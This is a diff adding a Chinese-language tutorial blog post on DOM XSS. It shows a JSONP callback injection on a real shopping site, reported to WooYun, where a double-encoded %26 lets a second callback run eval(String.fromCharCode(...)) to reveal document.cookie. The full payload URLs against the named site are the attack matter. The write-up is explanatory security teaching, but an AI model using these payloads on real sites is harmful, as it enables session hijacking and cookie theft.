@@ -1,0 +1,89 @@
+<html>
+<head>
+	
+	<title>(level 10)DOM XSS 的奥义 -- XSS升级之路</title>
+	<meta name="keywords" content="Just do, Just for fun" />
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+    <!--<link rel="stylesheet" href="/css/main.css" type="text/css">
+-->
+	<link href="/css/main.css?v=2" rel="stylesheet" type="text/css" />
+    <!--<link rel="stylesheet" href="/css/style.css" type="text/css">
+-->
+    
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Atom feed">
+
+    
+	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2"/>
+    
+
+</head>
+
+<body>
+
+<h1 id="DOM_XSS奥义">DOM XSS奥义</h1>
+<p>一些我们普遍了解的XSS 基本已经让大部分开发者们警醒，也都做了足够充分的教训，所以想要像以前那样随意的挖洞就不可能了，但是XSS 是无穷的，只要能深入源码，总会有所发现。</p>
+<p>常常程序会动态加载json 数据，同域可以用ajax,而不同域时，就需要跨域请求，有一种方法是jsonp,利用callback回调完成跨域，而在调用外部数据的时候还会带上一些参数，而如果这些参数可控，我们就可以试图去挖掘漏洞。</p>
+<p>对于跨域的请求来说，最常见的形式是这样：</p>
+<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">somescript.src=<span class="string">"http://otherdomain.com/xx?jsonp=callback"</span></div></pre></td></tr></table></figure>
+
+<p>而为了方便，callback 后边会带上一些参数，有一些参数是用户可控的，那时候，就会造成困扰了：</p>
+<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">somescript.src=<span class="string">"http://otherdomain.com/xx?jsonp=callback&id="</span>+id;</div></pre></td></tr></table></figure>
+
+<p>如果其中的ID 可控，那就很有可能会带来问题，这算是一种地址可控，而地址可控分为三种形式：</p>
+<p>一种是，完全可控，也就是src 后边的内容可以直接替换掉，这种可以直接利用，替换成我们的JS 地址。</p>
+<p>一种是部分可控：</p>
+<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">script src=<span class="string">"/path/xxx/[路径可控]/1.js"</span></div></pre></td></tr></table></figure>
+
+<p>这种情况下一般是在同域下寻找一个有漏洞的上传点，上传些文件什么的，以便利用。</p>
+<p>第三种情况是参数可控：</p>
+<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">script src=<span class="string">"/xxxx/json.php?callback=xxxx&param1=yyy&param2=[参数可控]"</span></div></pre></td></tr></table></figure>
+
+<p>以乌云某例为例：<br><a href="http://sse1.paipai.com/comm_json?callback=commentListCallBack&amp;dtag=1&amp;ac=1&amp;cluster=1&amp;sellquality=0&amp;NewProp=&amp;Property=256&amp;PageNum=1&amp;PageSize=48&amp;OrderStyle=80&amp;Address=&amp;SaleType=1&amp;degree=1&amp;AuthType=2&amp;BeginPrice=&amp;EndPrice=&amp;KeyWord=2012%20%D0%C2&amp;OnlineState=2&amp;Paytype=4&amp;ranking=&amp;sClassid=&#39;aaaaaaaa&amp;t=1354854681" target="_blank" rel="external">http://sse1.paipai.com/comm_json?callback=commentListCallBack&amp;dtag=1&amp;ac=1&amp;cluster=1&amp;sellquality=0&amp;NewProp=&amp;Property=256&amp;PageNum=1&amp;PageSize=48&amp;OrderStyle=80&amp;Address=&amp;SaleType=1&amp;degree=1&amp;AuthType=2&amp;BeginPrice=&amp;EndPrice=&amp;KeyWord=2012%20%D0%C2&amp;OnlineState=2&amp;Paytype=4&amp;ranking=&amp;sClassid=&#39;aaaaaaaa&amp;t=1354854681</a></p>
+<p>经过简单在这个页面测试，我们可以发现，其中的callback, dtag, ranking 是可控的。不过可控的元素还是会被过滤的，比如常见的尖括号就一定会被过滤。</p>
+<p>实际在使用中，访问这个跨域数据的是以下URL:<br><a href="http://bag.paipai.com/search_list.shtml?type=&amp;callback=alert(1);&amp;np=11&amp;pro=256&amp;searchtype=2&amp;cs=0010000&amp;keyword=&amp;PTAG=20058.13.13" target="_blank" rel="external">http://bag.paipai.com/search_list.shtml?type=&amp;callback=alert(1);&amp;np=11&amp;pro=256&amp;searchtype=2&amp;cs=0010000&amp;keyword=&amp;PTAG=20058.13.13</a></p>
+<p>因为dtag，ranking 是放在双引号里的，过滤了双引号，基本很难有可以应用的地方。而callback 则不是，如果能构造一个callback=alert(1) ，就可以执行XSS，不过在我们发现写在一开始的callback 并不能直接去改变值来控制它，我们可以想办法通过后边可控的参数，用&amp;来分隔后再来一个callback=alert(1)来覆盖前边的callback。</p>
+<p>不过一般来说，如果你在构造URL 的时候，如果使用了&amp;，那就会直接认为你这是分隔符，这个方法就失效了。而如果我们试图使用%26 这个URL 编码来代替，但是它在传递的时候，并不会解码，所以也不会让服务器解析的时候才认定他是分隔符。</p>
+<p>所以，只能去从源码里找漏洞,我们找到他的search.js脚本，定位到那一块观察上下文：</p>
+<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>{</div><div class="line"></div><div class="line">        <span class="keyword">var</span> keyword = decodeURIComp($getQuery(<span class="string">'keyword'</span>)),</div><div class="line"></div><div class="line">        type = $getQuery(<span class="string">'type'</span>),</div><div class="line"></div><div class="line">        searchtype = $getQuery(<span class="string">'searchtype'</span>);</div><div class="line"></div><div class="line">        option.keyword = keyword;</div><div class="line"></div><div class="line">        option.classId = type;</div><div class="line"></div><div class="line">        option.searchType = searchtype || option.searchType;</div><div class="line"></div><div class="line">        option.beginPrice = $getQuery(<span class="string">'bp'</span>);</div><div class="line"></div><div class="line">        option.endPrice = $getQuery(<span class="string">'ep'</span>);</div><div class="line"></div><div class="line">        option.NewProp = $getQuery(<span class="string">'np'</span>) || $getQuery(<span class="string">'newprop'</span>);</div><div class="line"></div><div class="line">        option.property = $getQuery(<span class="string">'pro'</span>) || option.property;</div><div class="line"></div><div class="line">        option.cid = $getQuery(<span class="string">'cid'</span>);</div><div class="line"></div><div class="line">        option.Paytype = $getQuery(<span class="string">'pt'</span>) || option.Paytype;</div><div class="line"></div><div class="line">        option.hongbaoKeyword = $getQuery(<span class="string">'hb'</span>);</div><div class="line"></div><div class="line">        option.conditionStatus = $getQuery(<span class="string">'cs'</span>) || option.conditionStatus;</div><div class="line"></div><div class="line">        option.showType = $getQuery(<span class="string">'show'</span>) || option.showType;</div><div class="line"></div><div class="line">        option.mode = $getQuery(<span class="string">'mode'</span>) || option.mode;</div><div class="line"></div><div class="line">        option.address = decodeURIComp($getQuery(<span class="string">'adr'</span>));</div><div class="line"></div><div class="line">        option.orderStyle = $getQuery(<span class="string">'os'</span>) || option.orderStyle || <span class="number">80</span>;</div><div class="line"></div><div class="line">        option.hideKeyword = $getQuery(<span class="string">'hkwd'</span>) == <span class="string">"true"</span> ? <span class="literal">true</span>: <span class="literal">false</span>;</div><div class="line"></div><div class="line">        option.ptag.currentPage = $getQuery(<span class="string">'ptag'</span>) || $getQuery(<span class="string">'PTAG'</span>);</div><div class="line"></div><div class="line">        <span class="keyword">var</span> pageIndex = $getQuery(<span class="string">'pi'</span>),</div><div class="line"></div><div class="line">        pageSize = $getQuery(<span class="string">'ps'</span>);</div><div class="line"></div><div class="line">        option.pageIndex = (pageIndex && $isPInt(pageIndex)) ? pageIndex * <span class="number">1</span>: option.pageIndex;</div><div class="line"></div><div class="line">        option.pageSize = (pageSize && $isPInt(pageSize)) ? pageSize * <span class="number">1</span>: option.pageSize;</div><div class="line"></div><div class="line">    };</div></pre></td></tr></table></figure>
+
+<p>这里的脚本，就是jason参数和当前页面获得参数的一些关系，而其中有一个函数让我们看到了希望： decodeURLComp，它在传进来的时候，会被解码一次，有木有想起什么。对于这个keyword，如果我们使用了URL 编码传%26进去，他会解码成&amp;，那么我们直接使用%26callback=alert(1)，那就可以会被解码成一个分隔符，然后出发我们的漏洞。</p>
+<p>构造URL：<br><a href="http://bag.paipai.com/search_list.shtml?type=213280&amp;np=11&amp;pro=256&amp;searchtype=2&amp;cs=0010000&amp;keyword=%26callback=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));void&amp;PTAG=20058.13.13" target="_blank" rel="external">http://bag.paipai.com/search_list.shtml?type=213280&amp;np=11&amp;pro=256&amp;searchtype=2&amp;cs=0010000&amp;keyword=%26callback=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));void&amp;PTAG=20058.13.13</a></p>
+<p>抓个包，可以看到接收的json 数据已经得到改变：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-06-02-14648755927662.jpg" alt=""></p>
+<p>弹窗就是自然的了。</p>
+<p>其实，这个漏洞已经显得有些运气成分了，也可以说是开发者在业务的逻辑关系变得复杂之后，往往就缺乏足够的安全意识，去处理这些跨域安全问题了，往往在源码上，会造成一些漏洞。上边的例子我们也能看到，本身在过滤的逻辑上，已经很难寻找漏洞，但是因为开发者在处理流程的时候，没有去思考它可能的上下文关系，也就主动创造了一个漏洞出来。</p>
+<p>DOM XSS 的内容，大概也就这么多了。在DOM XSS 漏洞的挖掘中，最常用的自动化挖掘方式，其实就是利用爬虫和抓包重放，爬虫通过遍历某网站的各种结构URL，然后抓包重放去构造独特的字符替换掉URL中那些可控的参数，通过服务器返回的状态，和内容，去挖掘可能存在的不安全因素。</p>
+<p>而挖掘到不安全因素，只是XSS 最早的第一步，现在，那些最常见的漏洞已经基本销声匿迹，需要的是通过分析源码，寻找某个点的上下文关系，通过理清逻辑关系，寻找开发者在其中的疏漏，才能创造出合适的XSS。</p>
+
+
+<!--<a href="http://yoursite.com/2016/06/02/-level-10-DOM-XSS-的奥义-XSS升级之路/#disqus_thread" class="article-comment-link">Comments</a>-->
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'null'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+<div style="display:none">
+<script src="http://s4.cnzz.com/stat.php?id=undefined&web_id=undefined" language="JavaScript"></script>script>
+</div>
+
+
+
+
+
+
+
+</body>
+</html>
